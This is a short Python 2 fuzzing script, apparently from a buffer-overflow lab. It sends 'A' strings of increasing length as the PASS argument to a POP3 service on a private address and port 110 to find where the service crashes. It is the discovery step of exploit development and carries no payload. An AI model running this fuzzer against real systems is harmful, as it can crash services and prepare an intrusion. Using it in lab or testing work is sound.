#!/usr/bin/python

import socket

#Create array of buffers

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter += 100

for string in buffer:
    print "Fussing %s characters " % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.178.76', 110))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
